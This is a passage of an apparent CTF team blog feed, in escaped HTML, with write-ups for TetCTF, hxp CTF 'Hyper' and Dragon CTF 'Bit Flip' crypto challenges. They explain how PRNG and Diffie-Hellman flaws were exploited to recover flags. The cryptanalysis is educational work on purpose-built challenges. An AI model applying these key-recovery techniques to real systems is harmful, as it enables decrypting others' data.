     &lt;span style=&#34;color:#ae81ff&#34;&gt;34230477038891719323025391618998268890391645779869016241994899690290519616973&lt;/span&gt;)

Zp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GF(p)

g &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Zp(G[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; G[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# equivalently, g = Zp(complex_pow(G, r, p).re)&lt;/span&gt;
h &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Zp(H[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; H[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# and           h = Zp(complex_pow(H, r, p).re)&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; g&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;q &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
x_mod_q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; h&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log(g)
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x % q =&amp;#39;&lt;/span&gt;, x_mod_q) &lt;span style=&#34;color:#75715e&#34;&gt;# 26176203815975575469683683780455489251&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&#34;alert success&#34;&gt;
  &lt;strong&gt;Takeaway.&lt;/strong&gt; Sage is powerful. It tooks 3 minutes for my PC to compute the discrete log, where the time complexity should be $\mathcal{O}(\sqrt{q})$. Also, &lt;em&gt;do not use&lt;/em&gt; &lt;code&gt;discrete_log(h, g)&lt;/code&gt;. Use &lt;code&gt;h.log(g)&lt;/code&gt; instead.
&lt;/div&gt;
  

&lt;div class=&#34;alert info&#34;&gt;
  &lt;strong&gt;Mini Checklist&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; $x\ \text{mod}\ p$&lt;/li&gt;
&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; $x\ \text{mod}\ q$&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; $x\ \text{mod}\ r$&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
  

&lt;h3 id=&#34;part-iv-combining-the-building-blocks&#34;&gt;Part IV: Combining the building blocks&lt;/h3&gt;

&lt;p&gt;With Chinese remainder theorem, we are able to recover $x_0 := x\ \text{mod}\ pq$. It may not equal to $x$, but they are differ from a small multiple of $pq$. We can simply compute $x_0 + kpq$ for some small $k\in\mathbb{N}$ until $k$ is obtained. After that we have the flag - &lt;code&gt;TetCTF{h0m0m0rph1sm_1s_0ur_fr13nd-mobi:*100*231199111007#}&lt;/code&gt;. This challenge makes me think more about discrete logarithm, and I am amazed by the capability of Sage. I am still wondering why discrete logarithm of a 128-bit prime can be computed in just a few minutes...&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>hxp CTF 2020: Hyper</title>
      <link>https://b6a.black/posts/2020-12-20-hxpctf-hyper/</link>
      <pubDate>Sun, 20 Dec 2020 23:53:00 +0800</pubDate>
      
      <guid>https://b6a.black/posts/2020-12-20-hxpctf-hyper/</guid>
      <description>&lt;p&gt;I was teamed up to play &lt;em&gt;hxp CTF&lt;/em&gt; as @blackb6a last week. The &lt;em&gt;hxp&lt;/em&gt; team had come up with a collection of hard challenges. In particular, there are two series of crypto challenges with a total of five parts. I will be writing on the &lt;em&gt;hyper&lt;/em&gt; challenge and some follow-up and unanswered questions regarding to hyperelliptic curves.&lt;/p&gt;

&lt;div class=&#34;alert danger&#34;&gt;
  &lt;p&gt;ⓘ 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝘀𝗼𝘂𝗿𝗰𝗲𝘀 𝘀𝘁𝗮𝘁𝗲𝗱 𝘁𝗵𝗮𝘁 𝘁𝗵𝗶𝘀 𝗶𝘀 𝗺𝗶𝘀𝗹𝗲𝗮𝗱𝗶𝗻𝗴&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Seriously.&lt;/strong&gt; I knew nothing on hyperelliptic curves prior to the CTF. The writeup is solely based on what I learnt during the game, and may not be accurate. If you found a mistake, please do not hesitate to contact me. Many thanks! :smile:&lt;/p&gt;

&lt;/div&gt;
  

&lt;h2 id=&#34;challenge-summary&#34;&gt;Challenge Summary&lt;/h2&gt;

&lt;p&gt;In this series of challenge, the message &lt;code&gt;Hello! The flag is: hxp{...}&lt;/code&gt; is &lt;em&gt;xorred&lt;/em&gt; with an bytestream generated by an PRNG. In particular, the only difference between &lt;em&gt;hyper&lt;/em&gt; (crypto, 294 points) and &lt;em&gt;hyperhyper&lt;/em&gt; (crypto, 714 points) is the message lengths, respectively 45 and 93.&lt;/p&gt;

&lt;p&gt;Without doubt, the most crucial element for this challenge is the PRNG, which is based on &lt;em&gt;Jacobian of hyperelliptic curves&lt;/em&gt;. In this challenge, the Jacobian $\mathcal{J}$ of a hyperelliptic curve $\mathcal{H}$ of genus 3 over $\mathbb{Z}_p$ is used. $\mathcal{H}$ is defined by:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\mathcal{H}: y^2 \equiv x^7 + x\ (\text{mod}\ p).\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Three constant points $G_1, G_2, G_3$ from $\mathcal{J}$ are picked and three integers $k_1, k_2, k_3$ are picked randomly as the seed. Finally, define $H_n \in \mathcal{J}$ by $H_n := k_1^nG_1 + k_2^nG_2 + k_3^nG_3$ for $n\in\mathbb{N}$. If we write $H_n = \left(u_n\left(x\right), v_n\left(x\right)\right)$, where&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\begin{cases}
u_n(x) := u_{n0} + u_{n1} x + u_{n2} x^2 + u_{n3} x^3 \\
v_n(x) := v_{n0} + v_{n1} x + v_{n2} x^2
\end{cases},\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;then the random stream would be $(u_{10}, u_{11}, u_{12}, v_{10}, v_{11}, v_{12}, u_{20}, u_{21}, ...)$, where each of $u_{ij}$ and $v_{ij}$&#39;s is of 8 bytes.&lt;/p&gt;

&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;

&lt;h3 id=&#34;part-i-comparing-hyper-and-hyperhyper&#34;&gt;Part I: Comparing &lt;em&gt;hyper&lt;/em&gt; and &lt;em&gt;hyperhyper&lt;/em&gt;&lt;/h3&gt;

&lt;p&gt;One thing that made me very curious at first glance: We are given 24 bytes of the random bytestream from the known message in both &lt;em&gt;hyper&lt;/em&gt; and &lt;em&gt;hyperhyper&lt;/em&gt;, why is &lt;em&gt;hyperhyper&lt;/em&gt; an independent question? If we are able to recover internal state for the PRNG, wouldn&#39;t it be evident to solve the both parts?&lt;/p&gt;

&lt;p&gt;Of course, I would have not questions if I have understood the PRNG. Since the first 24 bytes are known, we have $u_1(x)$. For &lt;em&gt;hyper&lt;/em&gt;, we gotta recover the following 21 bytes, which is enough by recovering $v_1(x)$. After all, the points are given in &lt;em&gt;Mumford representation&lt;/em&gt;. With that said, if a point $P\left(u\left(x\right), v\left(x\right)\right)\in\mathcal{J}$, the below properties are satisfied&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:hyperelliptic-properties&#34;&gt;&lt;a class=&#34;footnote&#34; href=&#34;#fn:hyperelliptic-properties&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;$u(x)$ is monic,&lt;/li&gt;
&lt;li&gt;$f(x) \equiv [v(x)]^2\ \left(\text{mod}\ u\left(x\right)\right)$, and&lt;/li&gt;
&lt;li&gt;$\deg\left(v\left(x\right)\right) &amp;lt; \deg\left(u\left(x\right)\right) \leq 3$.&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;It is hinted from the second property that the objective is to find a modular square root for $f(x)$ under modulo $u(x)$.&lt;/p&gt;

&lt;h3 id=&#34;part-ii-midnight-thoughts&#34;&gt;Part II: Midnight thoughts&lt;/h3&gt;

&lt;p&gt;It was midnight when I realize this and I could not immediately think of an appropriate approach. I was even once expanding everything:&lt;/p&gt;

&lt;p&gt;Suppose that we have $u(x) := x^3 + rx^2 + sx + t$ and $v(x) := ax^2 + bx + c$. Then the following modular congruences hold:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\begin{cases}
-r^5 + 4r^3s - 3r^2t - 3rs^2 + 2st - a^2r^2 + 2abr + a^2s - 2ac - b^2 \equiv 0 \\
-r^4s + 3r^2s^2 - 4rst - s^3 + r^3t + t^2 + 1 - a^2rs + 2abs + a^2t - 2bc \equiv 0 \\
-r^4t + 3r^2st - 2rt^2 - s^2t - a^2rt + 2abt - c^2 \equiv 0
\end{cases}(\text{mod}\ p).\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;I must be very sleepy back then.&lt;/p&gt;

&lt;h3 id=&#34;part-iii-wake-up-wake-up&#34;&gt;Part III: Wake up, wake up!&lt;/h3&gt;

&lt;p&gt;After [&lt;em&gt;enter an arbitrary number&lt;/em&gt;] hours of sleep, I woke up and immediately recalled Tonelli-Shanks algorithm. Basically we are able to apply the algorithm to compute modular square root, even with modulo $u(x)$. Since $u(x)$ is a degree 3 polynomial over $\mathbb{Z}_p$, the order for $\mathcal{G} := \text{GF}(p)[x]/u(x)$ would be a factor of $p^3 - 1$. Knowing the order, we can apply Tonelli-Shanks to compute a modular square root for $f(x)$. After all, $v(x)$ would be one of them.&lt;/p&gt;

&lt;p&gt;The rest is trivial after we have $v_1(x)$ computed. Xorring the output with the keystream, we have the message: &lt;code&gt;Hello! The flag is: hxp{ez_P4rT_i5_ez__tL0Cm}&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&#34;part-iv-mysteries-of-hyperelliptic-curves&#34;&gt;Part IV: Mysteries of hyperelliptic curves&lt;/h3&gt;

&lt;div class=&#34;alert danger&#34;&gt;
  I am not going to talk about solutions anymore. This section contains a list of unproved properties which looked truthy for me. Those questions came to my mind while attempting &lt;em&gt;hyperhyper&lt;/em&gt;, while I have no proofs. The questions are no means useful for solving the questions, but I think they are helpful in pairing-based cryptography. They are very likely used somewhere anyway.
&lt;/div&gt;
  

&lt;p&gt;Let $\mathcal{J}$ be the Jacobian of a hyperelliptic curve of genus 3. Suppose that $\sigma$ is the order of $G_1, G_2, G_3\in\mathcal{J}$.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Question 1.&lt;/strong&gt; Is $a_1G_1 + a_2G_2 + a_3G_3$ also has an order $\sigma$ given that $gcd(a_i, \sigma)=1$?&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Question 2.&lt;/strong&gt; Define $S := \{k_1G_1 + k_2G_2 + k_3G_3 \in \mathcal{J}: k_1, k_2, k_3\in\mathbb{Z}\}$. Is $\left|S\right| = \sigma^3$?&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Question 3.&lt;/strong&gt; Let $(\mathbb{Z}_p^3, +)$ be a group and define $x = (x_1, x_2, x_3), y = (y_1, y_2, y_3) \in\mathbb{Z}_p^3$. Suppose $x+y = (x_1+y_1, x_2+y_2, x_3+y_3)$. Is $(\mathbb{Z}_p^3, +)$ isomorphic to $S$?&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;footnotes&#34;&gt;

&lt;hr&gt;

&lt;ol&gt;
&lt;li id=&#34;fn:hyperelliptic-properties&#34;&gt;Jasper Scholten, Frederik Vercauteren (2003). &amp;quot;An Introduction to Elliptic and Hyperelliptic Curve Cryptography and the NTRU Cryptosystem&amp;quot;&lt;br&gt;&lt;a href=&#34;https://homes.esat.kuleuven.be/~fvercaut/papers/cc03.pdf&#34;&gt;https://homes.esat.kuleuven.be/~fvercaut/papers/cc03.pdf&lt;/a&gt;
 &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:hyperelliptic-properties&#34;&gt;&lt;sup&gt;[return]&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>Dragon CTF 2020 Writeup</title>
      <link>https://b6a.black/posts/2020-11-23-dragonctf/</link>
      <pubDate>Mon, 23 Nov 2020 04:33:50 +0800</pubDate>
      
      <guid>https://b6a.black/posts/2020-11-23-dragonctf/</guid>
      <description>&lt;p&gt;&lt;em&gt;Dragon CTF 2020&lt;/em&gt; is definitely had my best CTF moments. There are big brain moments and I have been mind-blown for multiple times during the game. This time we have teamed up with @blackb6a. I have solved all the crypto challenges and two challenges with my teammates.&lt;/p&gt;

&lt;p&gt;There are three challenges writeup in this post:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Bit Flip (parts 2 and 3)&lt;/li&gt;
&lt;li&gt;Frying in motion&lt;/li&gt;
&lt;li&gt;babykok&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;bit-flip-crypto-155324343-points&#34;&gt;Bit Flip (Crypto, 155+324+343 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;challenge-summary&#34;&gt;Challenge Summary&lt;/h3&gt;

&lt;p&gt;At the beginning, a 128-bit &lt;code&gt;alice_secret&lt;/code&gt; (denoted as $a$) is generated. We are given an oracle that allows us to input a 256-bit value $v$. An PRNG $R$ uses $a\oplus v$ to derive:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;a 512-bit prime $p$ that is used for Diffie-Hellman, and&lt;/li&gt;
&lt;li&gt;a 64-bit secret $a$ that is Alice&#39;s secret key.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;For each oracle call, the following will be printed&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;The number of &lt;code&gt;rng.getbits(512)&lt;/code&gt; calls for $p$ to be a prime,&lt;/li&gt;
&lt;li&gt;Bob&#39;s public key (which is generated randomly in each call), $B$,&lt;/li&gt;
&lt;li&gt;The encrypted flag (with AES-CBC &amp;amp; key is derived from the DH shared key):&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Of course, &lt;em&gt;the devil is in the detail&lt;/em&gt;. The AES-CBC &lt;code&gt;key&lt;/code&gt; is derived as follows:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;dh_shared_key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; pow(B, a, p)
key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; long_to_bytes(dh_shared_key, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)[:&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Furthermore, the PRNG is simple. It is maintaining a 256-bit state $s$. 512-bit and 64-bit numbers are generated respectively with:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getbits&lt;/span&gt;(bits&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt;):
    output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sha256(long_to_bytes(s, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;))&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digest() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sha256(long_to_bytes(s&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;))&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digest()
    s &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; output

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getbits&lt;/span&gt;(bits&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;):
    output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sha256(long_to_bytes(s, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;))&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digest()[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;:]
    s &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; output&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&#34;the-plot-twist&#34;&gt;The plot twist&lt;/h4&gt;

&lt;p&gt;This is the setting for part one. Parts two and three are pretty similar though.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Parts 2 and 3 are &lt;em&gt;not&lt;/em&gt; returning Bob&#39;s public key, and&lt;/li&gt;
&lt;li&gt;Part 3 uses the prime $p$ and check if $q := 2p+1$ is a prime. The prime $q$ (instead of $p$) is used for DH.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;solution&#34;&gt;Solution&lt;/h3&gt;

&lt;h4 id=&#34;part-i-the-real-bitflipping&#34;&gt;Part I: The real bit-flipping&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Bit Flip 1&lt;/em&gt; was solved in about 45 minutes. Basically we are able to recover $v$ from the number of &lt;code&gt;rng.getbits(512)&lt;/code&gt; calls. Since I am sure that there will be writeups on this part available online, I am skipping this part.&lt;/p&gt;

&lt;div class=&#34;alert warning&#34;&gt;
  I am just going to admit that I am lazy.
&lt;/div&gt;
  

&lt;h4 id=&#34;part-ii-a-nightmare-on-longtobytes&#34;&gt;Part II: A nightmare on &lt;code&gt;long_to_bytes&lt;/code&gt;&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Bit Flip 3&lt;/em&gt; was solved in 1 hour - and we were the first to solve. But wait, why isn&#39;t part II on &lt;em&gt;Bit Flip 2&lt;/em&gt;? The reason is simply because just I cannot solve it (yet).&lt;/p&gt;

&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2020-11-23-dragonctf/bit-flip-01.png&#34;
         alt=&#34;defund had the same question, too.&#34;/&gt; &lt;figcaption&gt;
            &lt;p&gt;defund had the same question, too.&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;


&lt;p&gt;The prime used for Diffie-Hellman can be 513-bit long. This makes the AES key derivation interesting - as &lt;code&gt;long_to_bytes(x, 16)&lt;/code&gt; actually prepend null bytes until the output size is a multiple of 16. For example:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; long_to_bytes(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;127&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hex()
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;80000000000000000000000000000000&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; long_to_bytes(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hex()
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0000000000000000000000000000000100000000000000000000000000000000&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Luckily (or unluckily) the shared key can be as large as 513 bits long. In that case, the first block would be &lt;code&gt;00 00 ... 00 00 01&lt;/code&gt; - and this is the AES key.&lt;/p&gt;

&lt;p&gt;We do not even need to know Alice&#39;s nor Bob&#39;s key. Basically there is around 25% chance for the DH shared key to be 513-bit. When it happens, the constant key is used and we are able to decrypt the flag - &lt;code&gt;DrgnS{C0nst_A3S_K3y_1111111111111!}&lt;/code&gt;. First blood 🩸!&lt;/p&gt;

&lt;h4 id=&#34;part-iii-playing-mindgames-on-bit-flip-2&#34;&gt;Part III: Playing mind-games on &lt;em&gt;Bit Flip 2&lt;/em&gt;&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Bit Flip 2&lt;/em&gt; was solved in about 12 hours. I was mind-blown when I know &lt;em&gt;da wae&lt;/em&gt;. Since the DH key could never be 513 bits long anymore, we can no longer exploit in the way as described in &lt;em&gt;Bit Flip 3&lt;/em&gt;.&lt;/p&gt;

&lt;div class=&#34;alert warning&#34;&gt;
  &lt;strong&gt;Wait.&lt;/strong&gt; This made me &lt;em&gt;very&lt;/em&gt; puzzled: How do we find the shared key (or $g^{ab}\ (\text{mod}\ p)$) if Bob is not telling us anything?
&lt;/div&gt;
  

&lt;p&gt;Basically we have three options:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Make $a = 0$. This implies that $g^{ab} \equiv 1$, resulting in a constant key.&lt;/li&gt;
&lt;li&gt;Find $a$ and $p$ such that $g^a\in\mathbb{Z}_p^*$ has a small order. Hence $\{g^{ab}\in\mathbb{Z}_p^*\ |\ b\in\mathbb{Z}\}$ can be exhausted feasibly.&lt;/li&gt;
&lt;li&gt;Make $p$ 385-bit long (or 1-bit, 129-bit or 257-bit). Then we are able to reuse the exploit on &lt;em&gt;Bit Flip 3&lt;/em&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;There is a point of time that over 10 teams have solved &lt;em&gt;Bit Flip 2&lt;/em&gt; while only &lt;em&gt;hxp&lt;/em&gt; and us have solved &lt;em&gt;Bit Flip 3&lt;/em&gt;. If option 3 is the way to go, the number of solves would not be the same. Moreover, option 2 is barely possible in a perspective of math. That said, unless there is a vulnerability that I am not awared of, we may need to make $a = 0$. That is equivalent to &lt;code&gt;rng.getbits(64) == 0&lt;/code&gt; and thus a 64-bit proof-of-work. Possible?&lt;/p&gt;

&lt;p&gt;During the research, I was wondering if there is a proof-of-work database that has a list of payloads with many trailing zeros as its hash. I was even wondering if there is someone ever able to solve a 64-bit proof-of-work (particularly on SHA256). Turns out I am too naive - &lt;em&gt;some&lt;/em&gt; are able to solve a 76-bit proof-of-work in around 10 minutes. Who? The bitcoin network.&lt;/p&gt;

&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2020-11-23-dragonctf/bit-flip-02.png&#34;
         alt=&#34;Let&amp;amp;rsquo;s appreciate the number of zeros&amp;amp;hellip;&#34;/&gt; &lt;figcaption&gt;
            &lt;p&gt;Let&amp;rsquo;s appreciate the number of zeros&amp;hellip;&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;


&lt;p&gt;The &lt;a href=&#34;https://en.bitcoin.it/wiki/Block_hashing_algorithm&#34;&gt;block hashing algorithm&lt;/a&gt; for Bitcoin is SHA256. This is how block 125552 (the smallest hash as of June 2011) is computed:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fromhex(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0100000081cd02ab7e569e8bcd9317e2fe99f2de44d49ab2b8851ba4a30&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;
                  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;8000000000000e320b6c2fffc8d750423db8b1eb942ae710e951ed797f7&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;
                  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;affc8892b0f1fc122bc7f5d74df2b9441a42a14695&amp;#39;&lt;/span&gt;)
m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hashlib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sha256(d)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digest()
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(m&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hex())
&lt;span style=&#34;color:#75715e&#34;&gt;# b9d751533593ac10cdfb7b8e03cad8babc67d8eaeac0a3699b82857dacac9390&lt;/span&gt;
h &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hashlib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sha256(m)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digest()
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(h&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hex())
&lt;span style=&#34;color:#75715e&#34;&gt;# 1dbd981fe6985776b644b173a4d0385ddc1aa2a829688d1e0000000000000000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The above hash ends with 8 null bytes. If the below seed generates a prime in its first call of &lt;code&gt;rng.getbits(512)&lt;/code&gt;, then &lt;code&gt;a = 0&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;seed = 0xb9d751533593ac10cdfb7b8e03cad8babc67d8eaeac0a3699b82857dacac938c&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Unfortunately it is not. Luckily there are many inputs (available on the Bitcoin network) that generates eight trailing null bytes as its hash. We can simply look at the blocks and find the one we need. For me, I was using the block API from &lt;em&gt;blockcypher.com&lt;/em&gt; to retrieve and compute the preimage of hashes. Eventually &lt;a href=&#34;https://live.blockcypher.com/btc/block/657972&#34;&gt;block 657972&lt;/a&gt; satisfies our needs and the Alice&#39;s secret key will be $a = 0$.&lt;/p&gt;

&lt;p&gt;That said, the AES key would be &lt;code&gt;00 00 ... 00 05 38&lt;/code&gt; when $a = 0$ - and we are able to decrypt the flag: &lt;code&gt;DrgnS{B1tc0in_p0w3r_crypt0_brut3}&lt;/code&gt;! :tada:&lt;/p&gt;

&lt;h2 id=&#34;frying-in-motion-crypto-324-points&#34;&gt;Frying in motion (Crypto, 324 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

